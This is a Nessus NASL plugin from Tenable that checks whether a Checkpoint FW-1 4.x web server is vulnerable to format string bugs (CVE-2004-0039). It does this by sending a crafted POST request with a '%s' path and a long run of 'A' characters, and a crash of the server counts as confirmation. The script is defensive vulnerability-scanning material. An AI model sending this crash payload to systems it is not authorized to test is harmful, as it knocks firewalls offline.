#
# Copyright (C) 2004 Tenable Network Security 
#


if(description)
{
    script_id(12084);
    script_bugtraq_id(10820, 9581);
    script_version ("$Revision: 1.9 $");
    name["english"] = "Multiple Checkpoint 4.x format strings";
    if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2004-A-0002");
    if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2004-t-0022");
    script_cve_id("CVE-2004-0039");

    script_name(english:name["english"]);
    desc["english"] = "
The remote Checkpoint Firewall web server crashes when sent a 
specially formatted HTTP request. This bug is a solid indicator
that the server is vulnerable to several Checkpoint FW-1 4.x bugs. 


Solution: Upgrade to Checkpoint-NG
Risk factor: High";

    script_description(english:desc["english"]);
    summary["english"] = "Crash Checkpoint Firewall";
    script_summary(english:summary["english"]);
    script_category(ACT_DENIAL);
    script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
    family["english"] = "Denial of Service";
    script_family(english:family["english"]);
    script_dependencie("http_version.nasl");
    exit(0);
}

#
# The script code starts here

include ("http_func.inc");
include ("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);
if(!get_port_state(port)) exit(0);

# first off, make sure server is actually responding and is FW-1
r = http_get_cache(item:"/", port:port);
if ( (!r) || (! egrep(string:r, pattern:"^FW-1 at")) ) exit(0);


req = string("POST %s/NessusScanner/nonexistent.html HTTP/1.0\r\n");
req +=  string(crap(data:"A", length:1024), "\r\n\r\n");


soc = http_open_socket(port);
if (soc) {
  send(socket:soc, data:req);
  r = recv_line(socket:soc, length:512);
  #display(r);
  if (!r) security_hole(port);
  close(soc);
}





